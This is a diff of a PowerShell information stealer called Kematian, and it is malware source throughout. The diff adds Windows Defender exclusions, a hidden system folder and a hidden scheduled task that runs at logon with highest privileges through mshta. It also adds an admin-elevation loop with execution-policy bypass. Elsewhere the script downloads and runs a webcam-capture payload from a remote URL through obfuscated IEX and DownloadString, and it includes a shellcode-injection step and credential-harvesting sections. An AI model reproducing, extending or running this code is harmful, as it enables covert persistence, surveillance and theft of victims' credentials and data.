@@ -8,6 +8,12 @@ else {
     $ProgressPreference = 'SilentlyContinue'
 }
 
+if ($MyInvocation.PSCommandPath) {
+    $isFile = $true
+} else {
+    $isFile = $false
+}
+
 function KDMUTEX {
     $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
     $CreatedNew = $false
@@ -24,6 +30,48 @@ function KDMUTEX {
         }
     }
 }
+
+function Invoke-TASKS {
+    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
+    Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian"
+
+    #if (Test-Path "$env:APPDATA")
+    #$task_name = "Kematian"
+    #$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)'
+    #$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+    #$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+    #Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
+    #Write-Host "[!] Task Created" -ForegroundColor Green
+#
+    #HOSTS-BLOCKER
+    #Backup-Data
+
+    if (!(Test-Path "$env:APPDATA\Kematian")) {
+        New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
+        # Hidden Directory
+        $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
+        $KDOT_DIR.attributes = "Hidden", "System"
+        Add-Normal
+    } else {
+        Remove-Item -Path "$env:APPDATA\Kematian" -Recurse -Force
+        if ($isFile) {
+            Add-Normal
+        }
+    }
+    HOSTS-BLOCKER
+    Backup-Data
+}
+
+function Add-Normal {
+    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\Kematian\Kematian.ps1" -Force
+    $task_name = "Kematian"
+    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)'
+    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
+    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
+    Write-Host "[!] Task Created" -ForegroundColor Green
+}
+
 
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
@@ -226,12 +274,17 @@ function HOSTS-BLOCKER {
 
 
 function Request-Admin {
+    # we can't request admin if we're not a file lmao
     while (-not (INVOKE-AC)) {
-        try {
-            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-            exit
+        if (-not ($isFile)) {
+            Exit 404
+        } else {
+            try {
+                Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+                exit
+            }
+            catch {}
         }
-        catch {}
     }
 }
 
@@ -848,7 +901,7 @@ Pass: $decodedPass
     Write-Host "[!] Capturing an image with Webcam !"
     $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
-    $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru -RedirectStandardOutput ($PSCommandPath + ":stdout")
+    $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $invokewebcam.WaitForExit()
     Write-Host "[!] Webcam captured !" -ForegroundColor Green
 
@@ -978,19 +1031,6 @@ Pass: $decodedPass
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
     Write-Host "[!] Shellcode Injection Completed !" -ForegroundColor Green
-
-    #$stdout = Get-Content ($PSCommandPath + ":stdout")
-    #$outArray = $stdout -split "`n"
-    ##for every line in outArray (line 1 = discord.json, line 2 = contents of discord.json base64 encoded gunzip)
-    #for ($i = 0; $i -lt $outArray.Length; $i += 2) {
-    #    $file = $outArray[$i]
-    #    Write-Host $file
-    #    $content = $outArray[$i + 1]
-    #    $content = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($content))
-    #    #ungzip the content
-    #    $content = [System.Text.Encoding]::UTF8.GetString([System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new([System.Convert]::FromBase64String($content)), [System.IO.Compression.CompressionMode]::Decompress))
-    #    $content | Out-File $file -Force
-    #}
 
     $main_temp = "$env:localappdata\temp"
 	
@@ -1233,25 +1273,6 @@ FileZilla: $filezilla_info
 	# cleanup
     Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
-}
-
-function Invoke-TASKS {
-    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
-    Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian"
-    New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
-    # Hidden Directory
-    $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
-    $KDOT_DIR.attributes = "Hidden", "System"
-    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\Kematian\Kematian.ps1" -Force
-    $task_name = "Kematian"
-    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)'
-    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
-    Write-Host "[!] Task Created" -ForegroundColor Green
-
-    HOSTS-BLOCKER
-    Backup-Data
 }
 
 if (INVOKE-AC -eq $true) {
